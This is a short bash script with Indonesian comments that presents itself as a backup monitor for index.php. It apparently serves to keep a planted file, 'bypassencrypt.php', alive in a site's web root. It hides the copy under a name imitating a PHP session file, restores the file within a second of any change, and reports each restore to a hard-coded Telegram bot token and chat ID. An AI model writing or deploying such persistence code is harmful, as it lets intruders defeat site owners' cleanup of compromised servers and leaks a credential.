#!/bin/bash

# Definisikan lokasi file index.php
INDEX_FILE="/home/misrcopper/public_html/bypassencrypt.php"
# Definisikan lokasi folder backup
BACKUP_FOLDER="/home/misrcopper/tmp/"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup
BACKUP_FILE="$BACKUP_FOLDER/sess_a4f5070dbf4febb6d35372c2dd7729b88888"

# Token dan ID chat Telegram
TOKEN="7638048684:AAHRQpb9ejkt6YZl7-4cxy437V8TxR2Qv3Q"
CHAT_ID="6528413893"  # Ganti dengan ID chat Anda

# Fungsi untuk mengirim notifikasi ke Telegram
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message"
}

# Backup file index.php jika belum ada backup
if [ ! -f "$BACKUP_FILE" ]; then
    cp "$INDEX_FILE" "$BACKUP_FILE"
    echo "Backup pertama dibuat: $BACKUP_FILE"
    send_telegram_notification "Backup pertama dibuat: $BACKUP_FILE"
fi

# Fungsi untuk memonitor perubahan pada file index.php
monitor_file() {
    while true; do
        # Hitung checksum file index.php untuk mendeteksi perubahan
        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')

        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            # Jika checksum berbeda, kembalikan file index.php dari backup
            echo "Perubahan terdeteksi pada index.php, mengembalikan backup..."
            cp "$BACKUP_FILE" "$INDEX_FILE"
            echo "index.php dikembalikan ke versi backup."
            send_telegram_notification "Perubahan terdeteksi pada index.php. File dikembalikan ke versi backup."
        fi

        # Tunggu 1 detik sebelum pengecekan selanjutnya
        sleep 1
    done
}

# Jalankan fungsi monitoring
monitor_file
